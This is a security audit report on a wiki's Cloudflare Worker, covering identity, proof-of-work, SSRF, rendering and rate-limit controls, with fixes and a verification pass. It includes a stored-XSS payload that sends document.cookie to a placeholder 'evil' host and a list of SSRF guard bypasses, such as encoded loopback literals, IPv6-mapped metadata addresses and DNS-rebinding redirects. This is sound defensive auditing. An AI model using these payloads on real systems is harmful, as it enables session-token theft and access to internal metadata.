# Security Audit — Wikigit Worker, identity, and render paths

Scope: the single Cloudflare Worker (`worker/src/`) router + handlers, identity
(`ip_hash` HMAC, session JWT, OAuth/OpenAuth providers), proof-of-work, the
`/cite` SSRF fetcher, client/SSR markdown render + sanitize, slug validation,
rate-limiting, multi-tenant isolation, and secrets handling. Each control was
probed adversarially. Project is pre-release (no real users) — findings are
weighted toward real exploitable defects, not production-hardening theater.

## Summary

| ID | Title | Severity |
|---|---|---|
| SEC-1 | Stored XSS: infobox `link`/`image` frontmatter rendered unsanitized (server + client) | High |
| SEC-2 | SSRF guard in `/cite` defeatable via DNS rebinding, decimal/octal/IPv6 IP literals, and cloud metadata | High |
| SEC-3 | Maintainer takeover: trust is keyed on display `name`, so a Wikigit handle can impersonate the owner / a trusted GitHub login | High |
| SEC-4 | Static/SSR markdown render path never runs DOMPurify (client path does) | Medium |
| SEC-5 | Proof-of-work is not bound to identity/content and `ts.salt` single-use key lets one solve cover many requests | Medium |
| SEC-6 | Rate limit is bypassable (no-op without KV, IP-rotation, fixed-window doubling) and PoW/bans/RL silently disabled when KV unbound | Medium |
| SEC-7 | Session JWT has no `alg`/`kid` confusion guard and no issuer/audience binding; long 7-day TTL with no revocation | Low |
| SEC-8 | `audit-log.jsonl` / `bans.json` / `trusted-editors.json` are public in the repo and leak an anon maintainer's `ip_hash` | Low |
| SEC-9 | Open CORS default (`*`) + token-in-URL-fragment OAuth return broadens session-token exposure | Low |
| SEC-10 | `ip_hash` truncated to 32 bits — collision/brute-force weakens bans and per-source rate limiting | Low |

---

## SEC-1 — Stored XSS via infobox `link`/`image` frontmatter (High)

Evidence — `src/lib/infobox.ts:35` and `:27`:
```js
const val = r.link
  ? `<a${cls} href="${esc(r.link)}" target="_blank" rel="noreferrer">${esc(r.v)}</a>`
  : `<span${cls}>${esc(r.v)}</span>`;
```
and the image:
```js
? `<div class="infobox-fig"><img src="${esc(meta.image)}" alt="" /></div>`
```
`esc()` (`infobox.ts:4`) only replaces `& < > "` — it does **not** validate the
URL scheme. `r.link` / `meta.image` come straight from page YAML frontmatter
(`normalizeRow`, `frontmatter.ts:47`; `splitFrontmatter` passes every key
through), which is fully attacker-controlled on an anonymous edit.

The resulting HTML is injected **without sanitization on both paths**:
- Server/static + edge-SSR: `[...slug].astro:60-61` renders
  `decorateArticleHtml(parsed.html, …)` and `PageShell` emits it via `set:html`;
  nothing in that chain calls DOMPurify (see SEC-4).
- Client: `WikiPage.tsx:51-53` `withInfobox(h, m) = infoboxHtml(slug, m) + h` is
  prepended to the already-sanitized body string and set via `innerHTML={html()}`
  (`WikiPage.tsx:231`). The infobox HTML is concatenated *after* `renderMarkdown`,
  so DOMPurify never sees it.

Exploit: a page with frontmatter
```yaml
infobox:
  Site: {v: "x", link: "javascript:fetch('//evil/?c='+document.cookie)"}
```
yields `<a href="javascript:…">` that runs on click for every reader. `image:`
permits `<img src=…>`-style payloads too. Because trusted-enough anon/GitHub
tiers auto-merge live (SPEC M5), this reaches readers with no review.

Why it matters: stored XSS in a wiki = session-token theft (the session JWT is
readable from `localStorage` per `AuthBoot`), maintainer-action forgery, and
content defacement, all from a single anonymous edit.

Fix: scheme-allowlist `r.link` and `meta.image` (`/^(https?:|\/|mailto:)/i`,
drop otherwise) before interpolation, **and** run the composed infobox HTML
through DOMPurify on the client (sanitize `withInfobox(...)` output, not just the
body) and through a sanitizer on the SSR path (SEC-4). Prefer building the
infobox through the same `renderMarkdown` sanitize boundary.

---

## SEC-2 — `/cite` SSRF guard has multiple bypasses (High)

Evidence — `worker/src/handlers/cite.ts:62-78`:
```js
const host = url.hostname.toLowerCase();
const blocked =
  /^(localhost|127\.|0\.|10\.|169\.254\.|192\.168\.|::1$|\[::1\])/.test(host) ||
  /^172\.(1[6-9]|2\d|3[01])\./.test(host) ||
  host.endsWith(".internal") || host.endsWith(".local");
```
The fetch then follows redirects (`redirect: "follow"`, `cite.ts:54`).

Gaps (each defeats the guard):
1. **DNS rebinding / attacker DNS**: the check is on the *hostname string*, not
   the resolved IP. `http://attacker.com/` whose A record points at `169.254.169.254`
   (or `127.0.0.1`) passes the regex and is fetched. This is the classic SSRF
   metadata-exfil path on any cloud host.
2. **Decimal/octal/hex IP literals**: `http://2130706433/` (= 127.0.0.1),
   `http://0x7f000001/`, `http://017700000001/` all bypass the `127.`/`0.` string
   match yet resolve to loopback.
3. **IPv6 forms**: only `::1` / `[::1]` are blocked. `[0:0:0:0:0:0:0:1]`,
   `[::ffff:127.0.0.1]` (IPv4-mapped), `[::ffff:a9fe:a9fe]` (169.254.169.254),
   and IPv6 ULA `[fd00::1]` all pass.
4. **Redirect bypass**: even a clean initial URL can 30x-redirect to
   `http://169.254.169.254/…`; `redirect: "follow"` chases it with no re-check.
5. **Other metadata endpoints**: GCP/Alibaba `metadata.google.internal` resolves
   via DNS (point your own host's CNAME at it); `100.100.100.100` (Alibaba) isn't
   in the list.

Why it matters: the Worker holds a GitHub App/PAT credential and runs on
Cloudflare; an attacker who can reach internal/metadata endpoints can pivot or
exfiltrate. On a self-hosted/multi-tenant deploy the blast radius is larger.

Fix: parse the host, reject IP-literals that aren't public (normalize decimal/
octal/hex/IPv6 first), resolve DNS and re-check the resolved address against the
private/link-local/loopback/CGNAT ranges, and **disable redirect-follow**
(`redirect: "manual"`) — or re-run the IP check on each hop. Cloudflare Workers
can't easily resolve+pin, so at minimum: block non-http(s), block all IP
literals, set `redirect: "manual"`, and cap to a small allowlist of citation
hosts if possible.

---

## SEC-3 — Maintainer takeover via display-name trust keying (High)

Evidence — trust is decided on `writer.name`, the *display* label, not the
provider-namespaced `key`:
- `worker/src/trust.ts:78-79`:
  ```js
  if (name === env.REPO_OWNER) return "maintainer";
  if ((await trustedEditors(env)).includes(name)) return "maintainer";
  ```
- `worker/src/identity/index.ts:95`: `requireMaintainer` →
  `editorTier(env, writer.name, writer.email)`.
- `writerFor` (`identity/index.ts:53-58`): GitHub `name = s.login`; **Wikigit
  `name = s.login` = the handle from the IdP** (`wikigitWriter`, `:40-49`); anon
  `name = anon-<hash>`.

The Wikigit provider (`identity/providers.ts:118`) returns
`login: user.handle` straight from the OpenAuth issuer. If the Wikigit IdP lets a
user register a handle equal to `REPO_OWNER` (e.g. `mde-pach`) or to any entry in
`trusted-editors.json`, that user is granted **maintainer** by `trust.ts:78-79`
— full ban/rollback/protect/grant/suppress/delete authority — without being the
real GitHub owner. The provider key (`wg:<sub>` vs `gh:<login>`) is correctly
namespaced for *bans and rate-limit* (`key`), but the maintainer check ignores
`key` entirely and matches on the cross-provider `name`.

Even within one provider: `trustedEditors` stores bare strings; granting
`alice` (intending the GitHub login) also elevates a Wikigit handle `alice`.

Why it matters: privilege escalation to sysop from a self-registerable account
namespace. The IdP is self-hosted (memory: OpenAuth on Coolify) so handle
uniqueness vs GitHub logins is not guaranteed.

Fix: key trust/maintainer checks on the provider-qualified `writer.key`
(`gh:login`, `wg:sub`), not the display `name`. Store `trusted-editors.json`
entries and the owner comparison as qualified keys (`gh:mde-pach`). Reserve
`name === REPO_OWNER` to the GitHub provider only.

---

## SEC-4 — SSR/static render path skips DOMPurify (Medium)

Evidence — `src/lib/markdown.ts:13-14`: the shared `md` instance is built
"(no DOMPurify, so it runs at build/SSR too)". The static + edge-SSR content page
calls `parsePage` → `md.render` → `decorateArticleHtml` and emits the result
(`[...slug].astro:59-61`); only the **client** path wraps output in
`renderMarkdown = DOMPurify.sanitize(...)` (`markdown.ts:144-146`).

`md` is created with `html: false` (`markdown.ts:14`), which escapes raw HTML
blocks, and markdown-it's default `validateLink` blocks `javascript:`/`data:` in
standard links — so the *body* is mostly safe at SSR. But every custom rule that
builds HTML directly bypasses both protections and is emitted unsanitized
server-side: the infobox (SEC-1), and any future attribute injection in
`wikilink`/`mention`/`citeTemplate`/`figures`/`decorateHeadingsHtml`. The SSR
path is therefore a strictly weaker sanitization boundary than the client, and is
the path crawlers and no-JS readers receive.

Why it matters: defense-in-depth gap; today it is the delivery vehicle for SEC-1
and would silently turn any future raw-HTML rule into stored XSS.

Fix: sanitize on the SSR/build path too. Run the final `decorateArticleHtml`
output through an isomorphic sanitizer (DOMPurify + a server DOM shim, or a
sanitizing markdown config) so server and client share one trust boundary, and
treat "HTML produced by a custom rule" as untrusted.

---

## SEC-5 — Proof-of-work not bound to request; replay window per `ts.salt` (Medium)

Evidence — `worker/src/moderation.ts:66-98`. The token is `<ts>.<salt>.<nonce>`;
`verifyPow` re-hashes the whole token and checks `leadingZeroBits >= bits`. The
single-use key is:
```js
const key = `pow:${tsStr}.${salt}`;   // moderation.ts:91
```

Problems:
1. **Not bound to identity, slug, or content.** A PoW token solved once is valid
   for *any* write endpoint (`/edit`, `/move`, `/merge`, `/split`, `/topic`,
   `/comment`) by *any* anonymous source within the 2-minute window. A small
   solver farm can mint tokens and feed them to a botnet — the "cost" doesn't
   scale per-edit because nothing ties a token to a specific action.
2. **Single-use only when KV is bound** (`if (env.RATE_LIMIT)`, `:90`). With no
   KV, `verifyPow` enforces difficulty but **no replay guard at all** — one solved
   token replays unlimited times.
3. **Window vs difficulty mismatch**: default 18 bits ≈ sub-second on a desktop,
   `POW_WINDOW_MS = 120_000`. An attacker pre-solves a batch keyed on distinct
   random salts and spends them across the window; the `ts.salt` key prevents
   reusing the *same* token but not minting many.

Why it matters: the PoW is the only bot gate on the anonymous write path
(sign-in is exempt). Its deterrence is weaker than intended because solves are
fungible across actions and identities.

Fix: bind the token to the request — include the target (slug/endpoint) and the
writer key in the hashed preimage and re-derive server-side; require KV for the
single-use guard (fail closed if PoW is enabled but KV absent); consider raising
default bits and shortening the window. At minimum, make single-use mandatory.

---

## SEC-6 — Rate limit / bans / PoW silently disabled and bypassable (Medium)

Evidence:
- `enforceRateLimit` (`moderation.ts:102-103`): `if (!env.RATE_LIMIT) return;` —
  **no rate limiting at all** until a KV namespace is bound. Same early-return
  disables the PoW single-use guard (`:90`) and the edit-war/3RR counters
  (`bumpEditWar`, `:34`). A misconfigured/forgotten KV binding turns off most
  abuse controls with no signal.
- Fixed-window, per-key (`rl:${author}`), max 5 / 600 s (`:5-6`). Two structural
  bypasses: (a) it keys on `writer.key` = `anon-<ip_hash>`, so **IP rotation**
  (or just being behind different egress IPs) yields a fresh bucket — and SPEC
  explicitly accepts that auto-tiers are IP-rotation-gameable; (b) fixed window
  (not sliding) allows ~2× burst at the boundary (5 at t=599s, 5 at t=601s).
- KV is eventually consistent (acknowledged `moderation.ts:100`), so concurrent
  requests can race past the limit before the counter propagates.

Why it matters: the rate limit is the quota behind PR review; combined with SEC-5
the anonymous write surface is more open than the design assumes, and a deploy
without KV is wide open.

Fix: fail closed (or loudly warn) when PoW/rate-limit are enabled but KV is
missing; move to a sliding window or per-window timestamp set; coarsen the hash
input to a `/24` (SPEC already floats this) so single-IP rotation within a subnet
doesn't reset the bucket; treat KV as a hard dependency for the abuse controls.

---

## SEC-7 — Session JWT: no alg-confusion/issuer binding, 7-day TTL, no revocation (Low)

Evidence — `worker/src/identity/auth.ts:46-64`. `verifySession`:
- recomputes the HMAC over `header.claims` and compares (`:54-55`) but **never
  checks the `alg`/`typ` in the decoded header** — it trusts whatever header
  bytes were signed. Since the same `SESSION_SECRET` signs both the session JWT
  and the OAuth `state` (`signState`, `:69-78`) with raw `hmacSign`, any place
  that produces an attacker-influenced HMAC over chosen bytes with this secret
  could be cross-used. No `iss`/`aud` binding ties a token to this Worker.
- TTL is 7 days (`SESSION_TTL_MS`, `:18`) with **no revocation** (stateless by
  design). A stolen token (e.g. via SEC-1 XSS reading `localStorage`) is valid
  for a week with no way to invalidate short of rotating `SESSION_SECRET`
  (logs out everyone).

Why it matters: amplifies the impact of any token-leak path. Not independently
critical because HS256 verification itself is sound (constant-time compare,
exp check).

Fix: assert `header.alg === "HS256"` and `typ === "JWT"` before accepting; add a
fixed `aud`/`iss` claim and verify it; shorten TTL (or add a short access + KV
deny-list for forced logout); never reuse `SESSION_SECRET` across token types
(use a domain-separation prefix in the signed input).

---

## SEC-8 — Public exposure of moderation files and an anon maintainer's `ip_hash` (Low)

Evidence — `bans.json`, `trusted-editors.json`, `audit-log.jsonl` are committed
at the repo root (git-tracked; confirmed `git ls-files`), and the read path
fetches them from `raw.githubusercontent.com/.../bans.json`
(`worker/src/github.ts:63-66`). The live `trusted-editors.json` contains:
```json
["anon-13ef295d"]
```
i.e. an anonymous pseudonym was granted **maintainer**, publicly. `audit-log.jsonl`
is also world-readable and `GET /audit` is maintainer-gated but the underlying
file is not.

Why it matters: the design intends `ip_hash` to be a privacy floor (no reveal).
Publishing an `anon-<hash>` in `trusted-editors.json` plus the public audit log
lets anyone correlate that pseudonym's full edit history and target it. Anyone
can also enumerate who is banned and the moderation timeline. This is privacy/OPSEC
leakage, not RCE.

Note (positive): `.env` with live Namecheap/Cloudflare/Coolify/SMTP secrets is
**not** tracked — `.gitignore` lists `.env` / `.env.*` and `git ls-files` shows
it absent. That control is sound; keep it.

Fix: avoid granting maintainer to bare `anon-<hash>` (it also ties into SEC-3 —
use qualified keys); if anon maintainers are intended, accept the linkability
tradeoff explicitly. Consider that `trusted-editors.json` being public means the
maintainer roster is public by design — fine for GitHub logins, leaky for anon.

---

## SEC-9 — Open CORS default + session token in URL fragment (Low)

Evidence:
- `worker/src/http.ts:34-44`: "Empty allowlist = allow any"; `corsHeaders`
  returns `Access-Control-Allow-Origin: *` when `ALLOWED_ORIGIN` is unset. Same
  default makes `isAllowedReturn` (`auth.ts:110-116` via `originAllowed`) accept
  **any** return origin, weakening the open-redirect guard to nothing when
  unconfigured.
- `authCallback` returns the freshly minted session JWT in the URL **fragment**
  (`auth.ts:154-156`: `dest.hash = wikitoken=${jwt}`). Fragments aren't sent to
  servers, but land in browser history and any client script on the destination.

Why it matters: a deploy that forgets `ALLOWED_ORIGIN` will mint sessions for and
CORS-allow arbitrary origins, so the post-login token can be delivered to an
attacker-chosen site. The wildcard `*.wikigit.org` matcher (`http.ts:22-31`) is
correct, but the empty-default is the risk.

Fix: fail closed — require `ALLOWED_ORIGIN` (or default to the Worker's own
origin) rather than `*`; never accept an unvalidated `return`. Prefer delivering
the session via a short-lived one-time code exchanged at the destination over a
URL-fragment token.

---

## SEC-10 — `ip_hash` truncated to 32 bits (Low)

Evidence — `worker/src/crypto.ts:14-20`: `ipHash` HMAC-SHA256s the IP then
`.slice(0, 8)` → **8 hex chars = 32 bits**. This value is the identity behind
bans (`bans.json` keys), rate-limit buckets (`rl:anon-<hash>`), and trust
counting.

Why it matters: 32 bits invites collisions (birthday bound ~65k distinct IPs for
a 50% collision) — two unrelated users can share one `anon-<hash>`, so a ban or
rate-limit on one affects the other, and trust history can blend. It also makes
the pseudonym cheaper to brute-force back to a candidate IP space than a full
HMAC would (mitigated by the secret key, but the truncation discards margin).

Fix: keep more of the digest (e.g. 12–16 hex chars) for the keying value; the
HMAC secret already prevents trivial reversal, so the only cost is a slightly
longer pseudonym.

---

## Controls that held up (probed, found sound)

- **JWT signature verify**: constant-time compare (`crypto.ts:35-39`), `exp`
  enforced (`auth.ts:59`), 3-part structure required.
- **OAuth CSRF state**: signed + 10-min TTL (`auth.ts:80-95`); provider rides
  signed state; callback re-validates return origin.
- **Slug / path traversal**: `SLUG_RE` (`types.ts:155`) is anchored, lowercase,
  no `..`, no leading/trailing/double slash; edit/move/merge/split/delete/restore
  all test it **and** add an explicit `slug.includes("..")` belt-and-suspenders
  (`content.ts:280`, `moderation.ts:143,211`, `lifecycle.ts:20-26`,
  `move` `content.ts:594-597`).
- **Maintainer gating coverage**: every privileged route calls `requireMaintainer`
  (ban/unban/audit `handlers/bans.ts`; grant/revoke/editors `handlers/rights.ts`;
  suppress/unsuppress/listSuppressed `handlers/suppress.ts`; protect; patrol/tag/
  review/rollback/restore/delete `handlers/moderation.ts`). Read endpoints that
  expose moderation data (`/audit`, `/editors`, `/suppressed`) are gated; public
  reads (`/changes`, `/history`) apply server-side suppression redaction.
  (The *who* is verified weakly — see SEC-3 — but the gate placement is complete.)
- **Multi-tenant isolation**: `namespacedKV` (`tenant.ts:35-57`) prefixes every
  key with `r:<owner>/<name>:`; `REPO_RE` forbids `/` inside owner/name so
  prefixes can't alias; `assertServed` requires the App to be installed on the
  target repo before serving; single-tenant ignores the request repo entirely.
- **Mermaid**: rendered at `securityLevel: "strict"` (`decorate.ts:107-111`) and
  the fence content is `escapeHtml`'d into the placeholder (`markdown.ts:74`).
- **Comment bodyHTML**: `CommentView` injects GitHub's server-sanitized `bodyHTML`
  (`comments.ts:85` GraphQL field), not raw user input.
- **Secrets**: `.env` (live Namecheap/Cloudflare/Coolify/SMTP) is gitignored and
  untracked (confirmed). GitHub App tokens are short-lived, repo-scoped, cached
  per-repo (`githubApp.ts:133-158`).

---

## Verification

Adversarial re-audit of every Critical/High finding. Each was re-read from the
cited source independently.

**SEC-1 — Stored XSS via infobox `link`/`image` frontmatter — CONFIRMED (High).**
`esc()` (`infobox.ts:4-8`) only escapes `& < > "` and does not validate the URL
scheme; `infobox.ts:35` interpolates `esc(r.link)` directly into `href="…"`, so a
`javascript:` value (no quotes/brackets to escape) survives intact. `normalizeRow`
(`frontmatter.ts:47-49`) passes the YAML `link` through verbatim. Client path:
`WikiPage.tsx:78` sanitizes the body via `renderMarkdown(...)` but `:83`
`withInfobox(html, meta)` prepends `infoboxHtml(...)` *after* sanitization, set via
`innerHTML={html()}` (`:245`) — DOMPurify never sees the infobox. SSR path: the
island re-wraps `initialHtml` through the same unsanitized `withInfobox` (`:56`).
Token theft impact is real: session JWT lives in `localStorage` `wiki_session`
(`AuthBoot.astro:21`, `auth.ts:74`). One imprecision: the report says PageShell
emits the infobox via `set:html` on the SSR path; in fact the infobox is injected
by the client island in both cases. This does not change the conclusion (no
sanitizer on either path). Severity fair.

**SEC-2 — `/cite` SSRF guard bypasses — CONFIRMED (High).** `cite.ts:71-77`
matches on `url.hostname` string only, never the resolved IP; `redirect: "follow"`
(`:54`) chases redirects with no re-check. Decimal/octal/hex literals
(`2130706433`, `0x7f000001`), most IPv6 forms beyond `::1`, DNS-rebind hostnames,
and 30x→metadata all defeat the regex as described. Worker holds GitHub App creds.
Severity fair.

**SEC-3 — Maintainer takeover via display-name trust keying — CONFIRMED (High).**
`trust.ts:78` `if (name === env.REPO_OWNER) return "maintainer"` and `:79`
`trustedEditors(env).includes(name)` key on the display `name`. `requireMaintainer`
(`identity/index.ts:95`) passes `writer.name`. `wikigitWriter` (`:40-49`) sets
`name = s.login` where `s.login = user.handle` from the OpenAuth issuer
(`providers.ts:118`), while bans/RL correctly use the namespaced `key`
(`wg:<id>`). So a self-registered Wikigit handle equal to `REPO_OWNER` or a
`trusted-editors.json` entry is granted maintainer cross-provider, bypassing the
namespacing. IdP is self-hosted (memory), so handle uniqueness vs GitHub logins is
not guaranteed — the precondition is plausible, not hypothetical. Severity fair.

Summary: 3 of 3 High findings CONFIRMED; 0 refuted, 0 downgraded. One minor
evidence imprecision noted in SEC-1 (infobox injected by the client island, not
`set:html`) that does not affect the verdict.
